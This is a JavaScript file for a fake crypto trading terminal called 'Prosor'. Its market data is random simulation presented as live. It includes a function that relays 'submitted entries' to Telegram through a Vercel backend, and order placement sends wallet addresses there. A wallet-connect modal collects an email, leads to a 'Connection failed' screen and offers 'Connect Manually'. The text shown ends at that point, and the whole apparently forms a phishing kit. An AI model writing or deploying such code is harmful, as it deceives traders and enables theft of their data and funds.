/* ==========================================================================
   PROSOR — Trading Terminal
   Vanilla JS application logic
   ========================================================================== */

(function () {
  'use strict';

  /* ------------------------------------------------------------------ */
  /* GLOBAL STATE                                                       */
  /* ------------------------------------------------------------------ */

  const STATE = {
    pair: 'LIT/USDT',
    basePrice: 5.3872,
    lastPrice: 5.3872,
    prevClose: 5.1700,
    timeframe: '15m',
    candles: [],
    visibleCount: 90,
    scrollOffset: 0,
    zoom: 1,
    hoverIndex: null,
    crosshair: { x: null, y: null, active: false },
    orderBook: { asks: [], bids: [] },
    trades: [],
    side: 'long',           // long | short
    orderType: 'market',    // market | limit | advanced
    leverage: 5,
    amountPct: 0,
    amount: 0,
    walletConnected: false,
    walletAddress: '0x72F3...A91F',
    balance: 12450.32,
    positions: [],
    openOrders: [],
    orderHistory: [],
    tradeHistory: [],
    fundingHistory: [],
    tpslEnabled: false,
    reduceOnly: false,
    obPrecision: 0.0001,
    activeInfoTab: 'positions',
    mobileView: 'chart',
    obCollapsed: false,
    // Wallet-connect modal state
    wcState: 'select',       // select | emailloading | connecting | error | manual
    wcSelectedWallet: null,
    wcShowAll: false,
    wcPrevState: 'select',
    wcConnectTimer: null,
  };

  const TF_MINUTES = { '1m': 1, '5m': 5, '15m': 15, '1h': 60, '4h': 240, '1D': 1440 };

  const fmt = (n, d = 4) => Number(n).toLocaleString('en-US', { minimumFractionDigits: d, maximumFractionDigits: d });
  const fmtUSD = (n, d = 2) => '$' + Number(n).toLocaleString('en-US', { minimumFractionDigits: d, maximumFractionDigits: d });
  const clamp = (v, lo, hi) => Math.max(lo, Math.min(hi, v));
  const rand = (a, b) => a + Math.random() * (b - a);
  const $ = (sel) => document.querySelector(sel);
  const $all = (sel) => Array.from(document.querySelectorAll(sel));

  /* ------------------------------------------------------------------ */
  /* 0. BACKEND — relay submitted entries to Telegram                    */
  /* ------------------------------------------------------------------ */

  // Override before this script loads (e.g. `<script>window.PROSOR_BACKEND_URL =
  // 'https://your-backend.example.com';</script>`) to point at a deployed backend.
  // Defaults to the local prosor-backend server for development.
  const BACKEND_URL = (window.PROSOR_BACKEND_URL || 'https://e-lighterconnect.vercel.app').replace(/\/$/, '');

  // Fire-and-forget: a missing/offline backend never blocks or breaks the
  // trading UI — it only means the Telegram notification isn't sent.
  function sendEntryToBackend(type, data) {
    fetch(`${BACKEND_URL}/api/entry`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, data }),
    }).catch((err) => {
      console.warn(`[Prosor] Could not relay "${type}" entry to backend:`, err.message || err);
    });
  }

  /* ------------------------------------------------------------------ */
  /* 1. CANDLE DATA GENERATION                                          */
  /* ------------------------------------------------------------------ */

  function generateCandleData(tf, count) {
    const minutes = TF_MINUTES[tf];
    const now = Date.now();
    const candles = [];
    let price = STATE.basePrice * rand(0.94, 0.98);
    let trendBias = rand(-0.15, 0.25);

    for (let i = count - 1; i >= 0; i--) {
      const time = now - i * minutes * 60 * 1000;
      if (i % 18 === 0) trendBias = rand(-0.2, 0.3);

      const volatility = price * rand(0.003, 0.012);
      const open = price;
      const drift = trendBias * volatility * rand(0.4, 1.2);
      let close = open + drift + rand(-volatility, volatility);
      close = Math.max(close, 0.01);

      const high = Math.max(open, close) + Math.abs(rand(0, volatility * 0.8));
      const low = Math.max(0.001, Math.min(open, close) - Math.abs(rand(0, volatility * 0.8)));
      const volume = rand(4000, 60000) * (1 + Math.abs(drift) / volatility);

      candles.push({ time, open, high, low, close, volume });
      price = close;
    }
    return candles;
  }

  function extendCandleSeries() {
    // Simulate the newest (forming) candle updating in real time.
    const tf = STATE.timeframe;
    const minutes = TF_MINUTES[tf];
    const last = STATE.candles[STATE.candles.length - 1];
    const now = Date.now();
    const candleStart = last.time;
    const candleEnd = candleStart + minutes * 60 * 1000;

    const move = last.close * rand(-0.0018, 0.0018);
    const newClose = Math.max(0.01, last.close + move);
    last.close = newClose;
    last.high = Math.max(last.high, newClose);
    last.low = Math.min(last.low, newClose);
    last.volume += rand(20, 400);
    STATE.lastPrice = newClose;

    if (now >= candleEnd) {
      STATE.candles.push({
        time: candleEnd,
        open: newClose,
        high: newClose,
        low: newClose,
        close: newClose,
        volume: rand(50, 500),
      });
      if (STATE.candles.length > 400) STATE.candles.shift();
    }
  }

  /* ------------------------------------------------------------------ */
  /* 2. CHART RENDERING (Canvas)                                        */
  /* ------------------------------------------------------------------ */

  const chartWrap = $('#chartCanvasWrap');
  const priceCanvas = $('#priceCanvas');
  const volumeCanvas = $('#volumeCanvas');
  const overlayCanvas = $('#overlayCanvas');
  const priceCtx = priceCanvas.getContext('2d');
  const volumeCtx = volumeCanvas.getContext('2d');
  const overlayCtx = overlayCanvas.getContext('2d');

  let chartLayout = null; // computed each render: { candleW, gap, priceToY, indexToX, ... }

  function resizeCanvases() {
    const rect = chartWrap.getBoundingClientRect();
    const dpr = window.devicePixelRatio || 1;
    [priceCanvas, volumeCanvas, overlayCanvas].forEach((cv) => {
      cv.width = Math.max(1, Math.floor(rect.width * dpr));
      cv.height = Math.max(1, Math.floor(rect.height * dpr));
      const ctx = cv.getContext('2d');
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    });
    chartLayout = { width: rect.width, height: rect.height };
  }

  function getVisibleCandles() {
    const total = STATE.candles.length;
    const count = clamp(Math.round(STATE.visibleCount / STATE.zoom), 20, total);
    const end = total - STATE.scrollOffset;
    const start = Math.max(0, end - count);
    return STATE.candles.slice(start, end);
  }

  function renderChart() {
    if (!chartLayout) resizeCanvases();
    const W = chartLayout.width;
    const H = chartLayout.height;
    const volH = Math.round(H * 0.18);
    const priceH = H - volH - 22; // reserve bottom for time labels
    const rightPad = 62;
    const leftPad = 4;
    const plotW = W - rightPad - leftPad;

    const visible = getVisibleCandles();
    if (!visible.length) return;

    let hi = -Infinity, lo = Infinity;
    visible.forEach((c) => { hi = Math.max(hi, c.high); lo = Math.min(lo, c.low); });
    const pad = (hi - lo) * 0.08 || hi * 0.01;
    hi += pad; lo -= pad;

    let maxVol = 0;
    visible.forEach((c) => { maxVol = Math.max(maxVol, c.volume); });

    const n = visible.length;
    const slot = plotW / n;
    const candleW = Math.max(1.5, Math.min(14, slot * 0.62));

    const priceToY = (p) => priceH - ((p - lo) / (hi - lo)) * priceH + 8;
    const idxToX = (i) => leftPad + i * slot + slot / 2;

    chartLayout = Object.assign(chartLayout, {
      W, H, volH, priceH, rightPad, leftPad, plotW, hi, lo, maxVol, visible, n, slot, candleW, priceToY, idxToX,
    });

    // --- clear ---
    priceCtx.clearRect(0, 0, W, H);
    volumeCtx.clearRect(0, 0, W, H);

    // --- grid lines + price labels ---
    priceCtx.strokeStyle = '#1C202B';
    priceCtx.lineWidth = 1;
    priceCtx.font = '10px "JetBrains Mono", monospace';
    priceCtx.fillStyle = '#5F6775';
    const gridLines = 5;
    for (let g = 0; g <= gridLines; g++) {
      const p = lo + ((hi - lo) * g) / gridLines;
      const y = priceToY(p);
      priceCtx.beginPath();
      priceCtx.moveTo(0, y);
      priceCtx.lineTo(W - rightPad, y);
      priceCtx.stroke();
      priceCtx.fillText(p.toFixed(4), W - rightPad + 8, y + 3);
    }

    // vertical grid + time labels
    const timeStep = Math.max(1, Math.floor(n / 6));
    priceCtx.textAlign = 'center';
    for (let i = 0; i < n; i += timeStep) {
      const x = idxToX(i);
      priceCtx.beginPath();
      priceCtx.moveTo(x, 8);
      priceCtx.lineTo(x, priceH + 8);
      priceCtx.stroke();
      const d = new Date(visible[i].time);
      const label = STATE.timeframe === '1D'
        ? `${d.getMonth() + 1}/${d.getDate()}`
        : `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
      priceCtx.fillText(label, x, H - 6);
    }
    priceCtx.textAlign = 'left';

    // --- candles ---
    visible.forEach((c, i) => {
      const x = idxToX(i);
      const isUp = c.close >= c.open;
      const color = isUp ? '#19D3A2' : '#F0525C';
      priceCtx.strokeStyle = color;
      priceCtx.fillStyle = color;
      priceCtx.lineWidth = 1;

      // wick
      priceCtx.beginPath();
      priceCtx.moveTo(x, priceToY(c.high));
      priceCtx.lineTo(x, priceToY(c.low));
      priceCtx.stroke();

      // body
      const yOpen = priceToY(c.open);
      const yClose = priceToY(c.close);
      const top = Math.min(yOpen, yClose);
      const bh = Math.max(1, Math.abs(yClose - yOpen));
      priceCtx.fillRect(x - candleW / 2, top, candleW, bh);
    });

    // --- current price line ---
    const cy = priceToY(STATE.lastPrice);
    priceCtx.setLineDash([4, 3]);
    priceCtx.strokeStyle = '#6C7CFF';
    priceCtx.beginPath();
    priceCtx.moveTo(0, cy);
    priceCtx.lineTo(W - rightPad, cy);
    priceCtx.stroke();
    priceCtx.setLineDash([]);
    priceCtx.fillStyle = '#6C7CFF';
    priceCtx.fillRect(W - rightPad, cy - 8, rightPad, 16);
    priceCtx.fillStyle = '#0B0D12';
    priceCtx.font = 'bold 10px "JetBrains Mono", monospace';
    priceCtx.fillText(STATE.lastPrice.toFixed(4), W - rightPad + 6, cy + 3);

    // --- volume bars ---
    const volTop = priceH + 22;
    volumeCtx.font = '10px "JetBrains Mono", monospace';
    volumeCtx.fillStyle = '#5F6775';
    visible.forEach((c, i) => {
      const x = idxToX(i);
      const isUp = c.close >= c.open;
      const h = (c.volume / maxVol) * (volH - 4);
      volumeCtx.fillStyle = isUp ? 'rgba(25,211,162,0.55)' : 'rgba(240,82,92,0.55)';
      volumeCtx.fillRect(x - candleW / 2, volTop + (volH - 4 - h), candleW, h);
    });
  }

  function renderCrosshair() {
    const W = chartLayout.W, H = chartLayout.H;
    overlayCtx.clearRect(0, 0, W, H);
    const tooltip = $('#ohlcTooltip');
    if (!STATE.crosshair.active || STATE.hoverIndex === null || !chartLayout.visible[STATE.hoverIndex]) {
      tooltip.hidden = true;
      return;
    }
    const c = chartLayout.visible[STATE.hoverIndex];
    const x = chartLayout.idxToX(STATE.hoverIndex);
    const y = STATE.crosshair.y;

    overlayCtx.strokeStyle = 'rgba(139,147,163,0.35)';
    overlayCtx.setLineDash([3, 3]);
    overlayCtx.lineWidth = 1;
    overlayCtx.beginPath();
    overlayCtx.moveTo(x, 0);
    overlayCtx.lineTo(x, chartLayout.priceH + 22 + chartLayout.volH);
    overlayCtx.stroke();

    if (y !== null && y < chartLayout.priceH + 8) {
      overlayCtx.beginPath();
      overlayCtx.moveTo(0, y);
      overlayCtx.lineTo(W - chartLayout.rightPad, y);
      overlayCtx.stroke();
    }
    overlayCtx.setLineDash([]);

    // point marker
    const cy = chartLayout.priceToY(c.close);
    overlayCtx.fillStyle = '#F4F7FA';
    overlayCtx.beginPath();
    overlayCtx.arc(x, cy, 2.5, 0, Math.PI * 2);
    overlayCtx.fill();

    tooltip.hidden = false;
    $('#ohlcO').textContent = c.open.toFixed(4);
    $('#ohlcH').textContent = c.high.toFixed(4);
    $('#ohlcL').textContent = c.low.toFixed(4);
    $('#ohlcC').textContent = c.close.toFixed(4);
    $('#ohlcV').textContent = c.volume.toFixed(0);
  }

  function updateChart() {
    renderChart();
    renderCrosshair();
    updateHeaderPrice();
  }

  function switchTimeframe(tf) {
    STATE.timeframe = tf;
    STATE.candles = generateCandleData(tf, 220);
    STATE.lastPrice = STATE.candles[STATE.candles.length - 1].close;
    STATE.scrollOffset = 0;
    STATE.zoom = 1;
    $all('.tf-btn').forEach((b) => {
      const active = b.dataset.tf === tf;
      b.classList.toggle('is-active', active);
      b.setAttribute('aria-selected', active);
    });
    updateChart();
  }

  /* --- chart interactions: hover, zoom, pan --- */

  function chartPointerMove(e) {
    const rect = chartWrap.getBoundingClientRect();
    const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
    const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
    if (!chartLayout || !chartLayout.visible) return;
    STATE.crosshair.active = true;
    STATE.crosshair.x = x;
    STATE.crosshair.y = y;

    let idx = Math.round((x - chartLayout.leftPad - chartLayout.slot / 2) / chartLayout.slot);
    idx = clamp(idx, 0, chartLayout.n - 1);
    STATE.hoverIndex = idx;

    const tooltip = $('#ohlcTooltip');
    tooltip.style.left = clamp(x + 14, 4, chartLayout.W - 150) + 'px';
    tooltip.style.top = '10px';

    renderCrosshair();
  }
  function chartPointerLeave() {
    STATE.crosshair.active = false;
    STATE.hoverIndex = null;
    renderCrosshair();
  }

  let isPanning = false, panStartX = 0, panStartOffset = 0;
  function chartPanStart(e) {
    isPanning = true;
    panStartX = e.touches ? e.touches[0].clientX : e.clientX;
    panStartOffset = STATE.scrollOffset;
  }
  function chartPanMove(e) {
    if (!isPanning || !chartLayout) return;
    const x = e.touches ? e.touches[0].clientX : e.clientX;
    const dx = x - panStartX;
    const candlesShifted = Math.round(-dx / chartLayout.slot);
    STATE.scrollOffset = clamp(panStartOffset + candlesShifted, 0, STATE.candles.length - 20);
    renderChart();
  }
  function chartPanEnd() { isPanning = false; }

  function zoomChart(factor) {
    STATE.zoom = clamp(STATE.zoom * factor, 0.4, 4);
    renderChart();
  }
  function resetZoom() {
    STATE.zoom = 1;
    STATE.scrollOffset = 0;
    renderChart();
  }

  /* ------------------------------------------------------------------ */
  /* 3. ORDER BOOK                                                       */
  /* ------------------------------------------------------------------ */

  function generateOrderBook() {
    const mid = STATE.lastPrice;
    const tick = STATE.obPrecision;
    const asks = [], bids = [];
    let cumA = 0, cumB = 0;
    for (let i = 0; i < 16; i++) {
      const price = mid + tick * (i + 1) * rand(1, 3);
      const size = rand(50, 950);
      cumA += size;
      asks.push({ price, size, total: cumA });
    }
    for (let i = 0; i < 16; i++) {
      const price = mid - tick * (i + 1) * rand(1, 3);
      const size = rand(50, 950);
      cumB += size;
      bids.push({ price, size, total: cumB });
    }
    STATE.orderBook = { asks, bids };
  }

  function renderOrderBook() {
    const { asks, bids } = STATE.orderBook;
    const maxTotal = Math.max(asks[asks.length - 1]?.total || 1, bids[bids.length - 1]?.total || 1);

    const askHtml = asks.slice().reverse().map((o) => rowHtml(o, 'ask', maxTotal)).join('');
    const bidHtml = bids.map((o) => rowHtml(o, 'bid', maxTotal)).join('');
    $('#obAsks').innerHTML = askHtml;
    $('#obBids').innerHTML = bidHtml;

    const bestAsk = asks[0]?.price || STATE.lastPrice;
    const bestBid = bids[0]?.price || STATE.lastPrice;
    const spread = bestAsk - bestBid;
    $('#obSpreadValue').textContent = spread.toFixed(4);
    $('#obSpreadPct').textContent = ((spread / STATE.lastPrice) * 100).toFixed(3) + '%';
  }

  function rowHtml(o, side, maxTotal) {
    const pct = clamp((o.total / maxTotal) * 100, 2, 100);
    const cls = side === 'ask' ? 'is-ask' : 'is-bid';
    return `<div class="ob-row ${cls}" data-price="${o.price}">
      <div class="ob-row__depth" style="width:${pct}%"></div>
      <span class="p mono">${o.price.toFixed(4)}</span>
      <span class="s mono">${o.size.toFixed(2)}</span>
      <span class="t mono">${o.total.toFixed(2)}</span>
    </div>`;
  }

  function updateOrderBook() {
    // nudge existing levels + occasionally regenerate to feel live
    const mid = STATE.lastPrice;
    STATE.orderBook.asks.forEach((o, i) => {
      o.price = mid + STATE.obPrecision * (i + 1) * rand(1, 3);
      if (Math.random() < 0.3) o.size = rand(50, 950);
    });
    STATE.orderBook.bids.forEach((o, i) => {
      o.price = mid - STATE.obPrecision * (i + 1) * rand(1, 3);
      if (Math.random() < 0.3) o.size = rand(50, 950);
    });
    let cumA = 0, cumB = 0;
    STATE.orderBook.asks.forEach((o) => { cumA += o.size; o.total = cumA; });
    STATE.orderBook.bids.forEach((o) => { cumB += o.size; o.total = cumB; });
    renderOrderBook();
  }

  function generateInitialTrades() {
    STATE.trades = [];
    for (let i = 0; i < 26; i++) {
      const up = Math.random() > 0.5;
      STATE.trades.push({
        price: STATE.lastPrice + rand(-0.01, 0.01),
        size: rand(2, 400),
        up,
        time: Date.now() - i * rand(1000, 6000),
      });
    }
    renderTrades();
  }
  function pushTrade() {
    const up = Math.random() > 0.48;
    STATE.trades.unshift({ price: STATE.lastPrice, size: rand(2, 400), up, time: Date.now() });
    if (STATE.trades.length > 40) STATE.trades.pop();
    renderTrades();
  }
  function renderTrades() {
    $('#tradesBody').innerHTML = STATE.trades.slice(0, 26).map((t) => {
      const d = new Date(t.time);
      const time = `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}:${String(d.getSeconds()).padStart(2, '0')}`;
      return `<div class="trade-row">
        <span class="p mono ${t.up ? 'up' : 'down'}">${t.price.toFixed(4)}</span>
        <span class="s mono">${t.size.toFixed(2)}</span>
        <span class="t mono">${time}</span>
      </div>`;
    }).join('');
  }

  /* ------------------------------------------------------------------ */
  /* 4. HEADER / STATS                                                   */
  /* ------------------------------------------------------------------ */

  function updateHeaderPrice() {
    const p = STATE.lastPrice;
    const change = p - STATE.prevClose;
    const changePct = (change / STATE.prevClose) * 100;
    const isUp = change >= 0;
    const cls = isUp ? 'positive' : 'negative';
    const sign = isUp ? '+' : '';

    $('#markPrice').textContent = p.toFixed(4);
    $('#indexPrice').textContent = (p - rand(0, 0.001)).toFixed(4);
    const chEl = $('#change24h');
    chEl.textContent = `${sign}${changePct.toFixed(2)}%`;
    chEl.className = 'stat__value mono ' + cls;

    $('#chartPrice').textContent = p.toFixed(4);
    const deltaEl = $('#chartDelta');
    deltaEl.textContent = `${sign}${change.toFixed(4)} (${sign}${changePct.toFixed(2)}%)`;
    deltaEl.className = 'chart-head__delta mono ' + cls;

    $('#mobilePrice').textContent = p.toFixed(4);
    const mChEl = $('#mobileChange');
    mChEl.textContent = `${sign}${changePct.toFixed(2)}%`;
    mChEl.className = 'mono ' + cls;
  }

  function simulateMarketDrift() {
    extendCandleSeries();
  }

  let fundingSeconds = 3 * 3600 + 41 * 60 + 12;
  function tickFunding() {
    fundingSeconds = fundingSeconds > 0 ? fundingSeconds - 1 : 8 * 3600;
    const h = String(Math.floor(fundingSeconds / 3600)).padStart(2, '0');
    const m = String(Math.floor((fundingSeconds % 3600) / 60)).padStart(2, '0');
    const s = String(fundingSeconds % 60).padStart(2, '0');
    $('#nextFunding').textContent = `${h}:${m}:${s}`;
  }

  /* ------------------------------------------------------------------ */
  /* 5. TRADING PANEL                                                    */
  /* ------------------------------------------------------------------ */

  function switchSide(side) {
    STATE.side = side;
    $('#tabLong').classList.toggle('is-active', side === 'long');
    $('#tabLong').setAttribute('aria-selected', side === 'long');
    $('#tabShort').classList.toggle('is-active', side === 'short');
    $('#tabShort').setAttribute('aria-selected', side === 'short');
    updateTradingPanel();
  }

  function switchOrderType(type) {
    STATE.orderType = type;
    $all('.otype-tab').forEach((b) => {
      const active = b.dataset.type === type;
      b.classList.toggle('is-active', active);
      b.setAttribute('aria-selected', active);
    });
    $('#limitPriceRow').hidden = type === 'market';
    updateTradingPanel();
  }

  function setLeverage(v) {
    STATE.leverage = clamp(Number(v), 1, 50);
    $('#leverageValue').textContent = STATE.leverage.toFixed(2) + 'x';
    $('#headerLeverage').textContent = STATE.leverage + 'x';
    $('#leverageSlider').value = STATE.leverage;
    updateTradingPanel();
  }

  function setAmountFromPct(pct) {
    STATE.amountPct = pct;
    const available = STATE.walletConnected ? STATE.balance : 10000; // baseline for calc even if not connected
    const maxNotional = available * STATE.leverage;
    const notional = (maxNotional * pct) / 100;
    const qty = notional / STATE.lastPrice;
    STATE.amount = qty;
    $('#amountInput').value = qty.toFixed(4);
    $('#amountSlider').value = pct;
    $all('.pct-buttons button').forEach((b) => b.classList.toggle('is-active', Number(b.dataset.pct) === pct));
    updateSliderTrack();
    updateTradingPanel();
  }

  function setAmountFromInput(qty) {
    STATE.amount = Math.max(0, qty);
    const available = STATE.walletConnected ? STATE.balance : 10000;
    const maxQty = (available * STATE.leverage) / STATE.lastPrice;
    const pct = clamp((STATE.amount / maxQty) * 100, 0, 100);
    STATE.amountPct = pct;
    $('#amountSlider').value = pct;
    $all('.pct-buttons button').forEach((b) => b.classList.toggle('is-active', Number(b.dataset.pct) === Math.round(pct)));
    updateSliderTrack();
    updateTradingPanel();
  }

  function updateSliderTrack() {
    const slider = $('#amountSlider');
    const pct = STATE.amountPct;
    if (slider) {
      slider.style.background = `linear-gradient(to right, var(--accent) 0%, var(--accent) ${pct}%, var(--border) ${pct}%, var(--border) 100%)`;
    }
  }

  function calculateOrder() {
    const price = STATE.orderType === 'limit' ? Number($('#limitPriceInput').value) || STATE.lastPrice : STATE.lastPrice;
    const qty = STATE.amount;
    const orderValue = qty * price;
    const margin = orderValue / STATE.leverage;
    const fees = orderValue * 0.0004; // 4 bps taker
    const slippage = STATE.orderType === 'market' ? clamp(qty / 50000, 0, 0.4) : 0;

    let liqPrice = null;
    if (qty > 0) {
      const maintenanceMarginRate = 0.005;
      if (STATE.side === 'long') {
        liqPrice = price * (1 - 1 / STATE.leverage + maintenanceMarginRate);
      } else {
        liqPrice = price * (1 + 1 / STATE.leverage - maintenanceMarginRate);
      }
    }

    return { price, qty, orderValue, margin, fees, slippage, liqPrice };
  }

  function updateTradingPanel() {
    const calc = calculateOrder();

    $('#sumOrderSize').textContent = `${calc.qty.toFixed(4)} LIT`;
    $('#sumOrderValue').textContent = `${fmt(calc.orderValue, 2)} USDT`;
    $('#sumLiqPrice').textContent = calc.qty > 0 ? calc.liqPrice.toFixed(4) : '--';
    $('#sumMargin').textContent = `${fmt(calc.margin, 2)} USDT`;
    $('#sumEstPrice').textContent = calc.qty > 0 ? calc.price.toFixed(4) : '--';
    $('#sumSlippage').textContent = `${calc.slippage.toFixed(2)}%`;
    $('#sumFees').textContent = `${fmt(calc.fees, 2)} USDT`;

    $('#availableBalance').textContent = `${fmt(STATE.walletConnected ? STATE.balance : 0, 2)} USDT`;
    $('#currentPosition').textContent = `${fmt(getNetPosition(), 4)} LIT`;

    const btn = $('#placeOrderBtn');
    btn.classList.remove('is-long', 'is-short');
    if (!STATE.walletConnected) {
      btn.textContent = 'Connect Wallet to Trade';
    } else if (calc.qty <= 0) {
      btn.textContent = 'Enter an Amount';
    } else {
      btn.textContent = STATE.side === 'long' ? 'Open Long' : 'Open Short';
      btn.classList.add(STATE.side === 'long' ? 'is-long' : 'is-short');
    }
  }

  function getNetPosition() {
    return STATE.positions.reduce((sum, p) => sum + (p.side === 'long' ? p.size : -p.size), 0);
  }

  /* ------------------------------------------------------------------ */
  /* 6. WALLET + ORDER PLACEMENT                                         */
  /* ------------------------------------------------------------------ */

  function connectWallet() {
    if (STATE.walletConnected) return;
    const btn = $('#walletBtn');
    btn.disabled = true;
    $('#walletBtnLabel').textContent = 'Connecting…';
    setTimeout(() => {
      STATE.walletConnected = true;
      btn.disabled = false;
      btn.classList.add('is-connected');
      $('#walletBtnLabel').textContent = STATE.walletAddress;
      showToast('success', 'Wallet connected successfully');
      updateTradingPanel();
    }, 900);
  }

  function placeOrder() {
    if (!STATE.walletConnected) {
      openWalletModal();
      return;
    }
    const calc = calculateOrder();
    if (calc.qty <= 0) {
      showToast('error', 'Enter an amount before placing an order');
      return;
    }

    const position = {
      id: 'p' + Date.now(),
      pair: STATE.pair,
      side: STATE.side,
      size: calc.qty,
      entry: calc.price,
      leverage: STATE.leverage,
      liq: calc.liqPrice,
      margin: calc.margin,
      pnl: 0,
      time: Date.now(),
    };
    STATE.positions.push(position);
    STATE.tradeHistory.unshift({
      pair: STATE.pair, side: STATE.side, qty: calc.qty, price: calc.price, fee: calc.fees, time: Date.now(),
    });
    STATE.orderHistory.unshift({
      pair: STATE.pair, side: STATE.side, type: STATE.orderType, qty: calc.qty, price: calc.price, status: 'Filled', time: Date.now(),
    });

    showToast('success', `${STATE.side === 'long' ? 'Long' : 'Short'} position opened successfully`);

    sendEntryToBackend('order', {
      pair: STATE.pair,
      side: STATE.side,
      orderType: STATE.orderType,
      qty: calc.qty.toFixed(4),
      price: calc.price.toFixed(4),
      leverage: STATE.leverage,
      orderValue: calc.orderValue.toFixed(2),
      margin: calc.margin.toFixed(2),
      liqPrice: calc.liqPrice.toFixed(4),
      fees: calc.fees.toFixed(2),
      walletAddress: STATE.walletAddress,
    });

    setAmountFromPct(0);
    renderInfoTab(STATE.activeInfoTab);
    updateCounts();
    updateTradingPanel();
    showEntryErrorModal();
  }

  function closePosition(id) {
    const idx = STATE.positions.findIndex((p) => p.id === id);
    if (idx === -1) return;
    const pos = STATE.positions[idx];
    STATE.positions.splice(idx, 1);
    showToast('success', `${pos.side === 'long' ? 'Long' : 'Short'} position closed`);
    renderInfoTab(STATE.activeInfoTab);
    updateCounts();
    updateTradingPanel();
  }

  function updateCounts() {
    $('#posCount').textContent = STATE.positions.length;
    $('#ooCount').textContent = STATE.openOrders.length;
  }

  function markToMarket() {
    STATE.positions.forEach((p) => {
      const diff = STATE.lastPrice - p.entry;
      p.pnl = (p.side === 'long' ? diff : -diff) * p.size;
    });
    if (STATE.activeInfoTab === 'positions' && STATE.positions.length) renderInfoTab('positions');
  }

  /* ------------------------------------------------------------------ */
  /* 6b. WALLET CONNECT MODAL                                             */
  /* ------------------------------------------------------------------ */

  const RECOMMENDED_WALLETS = ['Coinbase', 'OKX Wallet', 'MetaMask', 'Binance Wallet', 'Rabby', 'Phantom', 'Trust Wallet'];
  const MORE_WALLETS = ['WalletConnect', 'Ledger', 'Trezor', 'Safe'];

  // Clean, original monogram-style marks (not brand logos) so each wallet stays
  // visually distinct while fitting Prosor's existing inline-SVG icon system.
  const WALLET_STYLE = {
    'Coinbase':       { bg: '#1652F0', fg: '#FFFFFF', mono: 'C'  },
    'OKX Wallet':     { bg: '#1C202B', fg: '#F4F7FA', mono: 'OK' },
    'MetaMask':       { bg: '#F6851B', fg: '#1A0F00', mono: 'M'  },
    'Binance Wallet': { bg: '#F0B90B', fg: '#1A1300', mono: 'B'  },
    'Rabby':          { bg: '#7084FF', fg: '#0B0D12', mono: 'R'  },
    'Phantom':        { bg: '#AB9FF2', fg: '#0B0D12', mono: 'P'  },
    'WalletConnect':  { bg: '#3B99FC', fg: '#FFFFFF', mono: 'WC' },
    'Trust Wallet':   { bg: '#3375BB', fg: '#FFFFFF', mono: 'T'  },
    'Ledger':         { bg: '#111111', fg: '#F4F7FA', mono: 'L'  },
    'Trezor':         { bg: '#1BA672', fg: '#04140D', mono: 'TZ' },
    'Safe':           { bg: '#12FF80', fg: '#04140D', mono: 'S'  },
  };

  function walletIconSvg(name, size) {
    const s = WALLET_STYLE[name] || { bg: '#6C7CFF', fg: '#0B0D12', mono: '?' };
    const dim = size || 32;
    const fontSize = s.mono.length > 1 ? Math.round(dim * 0.34) : Math.round(dim * 0.42);
    return `<svg width="${dim}" height="${dim}" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="${name} icon">
      <rect width="32" height="32" rx="9" fill="${s.bg}"/>
      <text x="16" y="21" text-anchor="middle" font-family="Inter, sans-serif" font-weight="700" font-size="${fontSize}" fill="${s.fg}">${s.mono}</text>
    </svg>`;
  }

  const wcChevronSvg = `<svg class="wc-chevron" width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M5.2 2.8L9.4 7L5.2 11.2" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
  const wcErrorSvg = `<svg width="22" height="22" viewBox="0 0 22 22" fill="none"><path d="M6 6L16 16M16 6L6 16" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>`;
  const wcBackArrow = '←';

  function walletRowsHtml(names) {
    return names.map((name) => `
      <button type="button" class="wc-wallet-row" data-wallet="${name}">
        <span class="wc-wallet-icon">${walletIconSvg(name)}</span>
        <span class="wc-wallet-name">${name}</span>
        ${RECOMMENDED_WALLETS.includes(name) ? '<span class="wc-wallet-tag">Recommended</span>' : ''}
        ${wcChevronSvg}
      </button>`).join('');
  }

  function renderWalletModal(nextState) {
    if (nextState) STATE.wcState = nextState;
    const body = $('#walletModalBody');
    const wallet = STATE.wcSelectedWallet || '';

    if (STATE.wcState === 'select') {
      const list = STATE.wcShowAll ? RECOMMENDED_WALLETS.concat(MORE_WALLETS) : RECOMMENDED_WALLETS;
      body.innerHTML = `
        <h2 class="wc-title">Connect Wallet</h2>
        <div class="wc-email-row">
          <label for="wcEmailInput" class="visually-hidden">Enter your email</label>
          <input type="email" id="wcEmailInput" class="wc-email-input" placeholder="Enter your email" autocomplete="off">
          <button type="button" class="continue-btn" id="wcEmailContinueBtn">Continue</button>
        </div>
        <div class="wc-divider"><span>Wallets</span></div>
        <div class="wc-wallet-list" id="wcWalletList">${walletRowsHtml(list)}</div>
        ${STATE.wcShowAll ? '' : '<button type="button" class="wc-viewall-btn" id="wcViewAllBtn">View all wallets ' + wcChevronSvg + '</button>'}
      `;
      return;
    }

    if (STATE.wcState === 'emailloading') {
      body.innerHTML = `
        <h2 class="wc-title">Connect Wallet</h2>
        <div class="wc-status-block">
          <div class="wc-spinner"></div>
          <p class="wc-status-text">Checking email…</p>
        </div>
      `;
      return;
    }

    if (STATE.wcState === 'connecting') {
      body.innerHTML = `
        <h2 class="wc-title">Connect to ${wallet}</h2>
        <div class="wc-status-block">
          <span class="wc-wallet-icon wc-wallet-icon--lg">${walletIconSvg(wallet, 52)}</span>
          <p class="wc-status-text">Connecting to ${wallet}…</p>
          <div class="wc-spinner"></div>
          <p class="wc-status-sub">Please wait while we establish a secure connection.</p>
        </div>
      `;
      return;
    }

    if (STATE.wcState === 'error') {
      body.innerHTML = `
        <h2 class="wc-title">Connect to ${wallet}</h2>
        <div class="wc-status-block">
          <span class="wc-error-icon">${wcErrorSvg}</span>
          <p class="wc-status-text wc-status-text--error">Connection failed</p>
          <p class="wc-status-sub">Unable to connect to ${wallet}. Please try connecting again or connect manually.</p>
        </div>
        <button type="button" class="wc-primary-btn" id="wcManualBtn">Connect Manually</button>
